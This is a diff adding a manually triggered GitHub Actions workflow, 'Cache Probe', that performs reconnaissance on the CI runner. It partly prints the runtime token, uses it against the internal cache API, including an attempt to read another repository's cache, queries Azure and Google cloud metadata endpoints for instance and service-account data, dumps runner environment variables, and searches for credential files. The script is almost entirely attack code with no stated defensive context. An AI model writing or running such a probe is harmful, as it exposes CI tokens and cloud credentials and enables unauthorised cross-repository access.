@@ -1,0 +1,61 @@
+name: Cache Probe
+on: workflow_dispatch
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Probe cache infrastructure
+        run: |
+          echo "=== CACHE INFRASTRUCTURE ==="
+          echo "Runner: $(uname -a)"
+          echo ""
+          
+          # Check what cache URLs are available
+          echo "ACTIONS_CACHE_URL: ${ACTIONS_CACHE_URL:-not set}"
+          echo "ACTIONS_RUNTIME_URL: ${ACTIONS_RUNTIME_URL:-not set}"
+          echo "ACTIONS_RUNTIME_TOKEN: ${ACTIONS_RUNTIME_TOKEN:0:20}..."
+          
+          # Try to list caches via the internal API
+          if [ -n "$ACTIONS_CACHE_URL" ]; then
+            echo ""
+            echo "=== LISTING CACHES ==="
+            curl -sS -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              "${ACTIONS_CACHE_URL}_apis/artifactcache/caches" 2>&1 | head -5
+            
+            echo ""
+            echo "=== TRYING CROSS-REPO CACHE ==="
+            # Try to access cache with a key from another repo
+            curl -sS -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              "${ACTIONS_CACHE_URL}_apis/artifactcache/cache?keys=npm-18-&version=*" 2>&1 | head -5
+          fi
+          
+          # Check runner network access
+          echo ""
+          echo "=== RUNNER ENVIRONMENT ==="
+          env | grep -E "^(GITHUB_|RUNNER_|ACTIONS_)" | sort
+          
+          echo ""
+          echo "=== RUNNER METADATA SERVICE ==="
+          # Try IMDS from the runner itself
+          curl -sS --connect-timeout 2 -H "Metadata: true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | head -3
+          curl -sS --connect-timeout 2 -H "Metadata-Flavor: Google" \
+            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" 2>&1 | head -3
+          
+          echo ""
+          echo "=== RUNNER NETWORK ==="
+          ip addr show 2>/dev/null | grep "inet "
+          cat /etc/resolv.conf 2>/dev/null
+          
+          echo ""
+          echo "=== INTERESTING FILES ==="
+          ls -la /home/runner/work/_temp/ 2>/dev/null | head -10
+          cat /home/runner/work/_temp/.runner_info 2>/dev/null || echo "No runner info"
+          ls -la /home/runner/.credentials* 2>/dev/null || echo "No creds"
+          
+          echo ""
+          echo "=== DOCKER/CONTAINER INFO ==="
+          cat /proc/1/cgroup 2>/dev/null | head -5
+          cat /.dockerenv 2>/dev/null && echo "IN DOCKER" || echo "Not in Docker"
